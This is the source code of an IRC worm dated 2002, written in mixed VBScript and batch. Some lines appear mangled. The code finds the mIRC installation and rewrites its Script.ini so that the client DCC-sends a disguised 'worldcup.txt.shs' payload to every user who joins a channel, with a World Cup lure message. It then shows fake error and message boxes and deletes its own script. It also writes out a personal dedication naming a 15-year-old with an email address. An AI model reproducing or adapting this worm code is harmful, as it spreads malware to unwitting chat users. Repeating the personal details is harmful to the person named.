on error resume next
For i = 1 To 3
If i = 1 Then Drive = "c"
If i = 2 Then Drive = "D"
If i = 3 Then Drive = "E"
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set f = fso.GetFolder(Drive & ":\")
    Set sf = f.SubFolders
    For Each f1 In sf

                        If fso.fileExists(f1 & "\MIRC.INI") Then mIRCDir = f1 & "\MIRC.INI"
                        Set G = fso.GetFolder(f1)
                        Set Y = G.SubFolders
                        For Each D1 In Y

                                If fso.fileExists(D1 & "\MIRC.INI") Then mIRCDir = D1 & "\MIRC.INI"
                                Set P = fso.GetFolder(D1)
                                Set W = P.SubFolders
                                For Each E1 In W

    If fso.fileExists(E1 & "\MIRC.INI") Then mIRCDir = E1 & "\MIRC.INI"
    Set Q = fso.GetFolder(E1)
    Set J = Q.SubFolders
    For Each T1 In J

    Next: Next: Next: Next: Next


if mIRCDir <> "" then


mIRCDir = Mid(mIRCDir, 1, InStrRev(mIRCDir, "\"))

mIRCDir = Replace(mIRCDir,"""","")

  .Set fso = CreateObject("Scripting.FileSystemObject")
  .Set f = fso.OpenTextFile(mIRCDir & "Script.ini", 2, True)
  .f.WriteLine "[script]"
.f.Write "n0=on 1:JOIN:#:if ( $me != $nick ) { /msg $Nick Hola, soy Hoko, mira como quedaron los resultados de los partidos del mundial de hoy! | /dcc send $NICK C:\worldcup.txt.shs }"
  .f.Close
.end if

Set Hokowshhoko = CreateObject("WScript.Shell")
Set Hokofsohoko= CreateObject("scripting.filesystemobject")
Hokowshhoko.run ("C:\hoko.bat")
ECHO.----------------------------------------------------------->>C:\HOKO.TXT
ECHO IRC-Worm.Hoko by Kuasanagui / 13 Junio de 2002>>C:\HOKO.TXT
ECHO ESTE PEQUE.O VIRUS >>C:\HOKO.TXT
ECHO ESTA DEDICADO A HOKO >>C:\HOKO.TXT
ECHO.----------------------------------------------------------->>C:\HOKO.TXT
ECHO Alias: Hoko >>C:\HOKO.TXT
ECHO Edad: 15 >>C:\HOKO.TXT
ECHO Pais: Espa.a >>C:\HOKO.TXT
ECHO E mail:cid800@hotmail.com >>C:\HOKO.TXT
ECHO Aprendiz de hacker,  >>C:\HOKO.TXT
ECHO le gusta mucho colecionar virus.  >>C:\HOKO.TXT
ECHO Gracias a el mis virus son >>C:\HOKO.TXT
ECHO detectados por Panda Antivirus >>C:\HOKO.TXT
ECHO.----------------------------------------------------------->>C:\HOKO.TXT
COPY worldcup.txt.shs c:\worldcup.txt.shs>>C:\HOKO.TXT
DEL C:\Hokillo.vbs>>C:\HOKO.TXT
CLS
@ECHO.-----------------------------------------------------------
@ECHO         ARCHIVO CORRUPTO NO ES POSIBLE ABRIRLO
@ECHO         (A) ACEPTAR  (N) ANULAR  (D) DESCARTAR
@ECHO.-----------------------------------------------------------
PAUSE>>C:\HOKO.TXT
MsgBox "    .YA VISTE EL FUTBOL HOY?   ", 4096 , "World Cup Korean Japan"